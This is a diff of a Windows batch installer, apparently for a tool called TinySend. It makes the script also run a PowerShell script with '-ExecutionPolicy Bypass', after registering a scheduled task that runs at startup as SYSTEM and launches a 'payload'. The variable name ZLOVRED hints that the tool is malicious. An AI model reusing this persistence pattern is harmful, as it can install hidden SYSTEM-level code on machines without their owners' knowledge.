@@ -49,6 +49,8 @@ set SCHEDEXE=%pathCMD%\schtasks.exe
 set SCHBAT=%SCHPROGPATH%\time_stamp_00.bat
 set SCHWSF=%ZLOVRED%\TinySendRun.wsf
 set WSCRIPTEXE=%pathCMD%\wscript.exe
+set POSHEXE=%pathCMD%\WindowsPowerShell\v1.0\powershell.exe
+set SETTINGTASKPS1=%ZLOVRED%\NIT.TinySend-Scheduleset.ps1
 
 Rem Set Other Variables
 rem
@@ -59,8 +61,10 @@ set SCHWSFCMD="%WSCRIPTEXE% //NoLogo //B %SCHWSF%"
 echo Check System Integrity...
 rem
 if not exist %SCHEDEXE% echo %SCHEDEXE% is not found && exit /b 1
+if not exist %POSHEXE% echo %POSHEXE% is not found && exit /b 1
 rem if not exist %SCHBAT% echo %SCHBAT% is not found && exit /b 1
 if not exist %SCHWSF% echo %SCHWSF% is not found && exit /b 1
+if not exist %SETTINGTASKPS1% echo %SETTINGTASKPS1% is not found && exit /b 1
 
 echo Download and Run Payload..
 rem
@@ -96,6 +100,7 @@ rem
 rem %SCHEDEXE% /CREATE /Sc ONSTART /Tn %SCHTASKNAME% /Tr %SCHBATCMD% /Ru system /DELAY 0000:00 /F
 %SCHEDEXE% /CREATE /Sc ONSTART /Tn %SCHTASKNAME% /Tr %SCHWSFCMD% /Ru system /DELAY 0002:00 /F
 if %errorlevel% neq 0 goto Error_Sched
+%POSHEXE% -NoLogo -NoProfile -ExecutionPolicy Bypass -File %SETTINGTASKPS1%
 goto End
 
 :Error_Sched
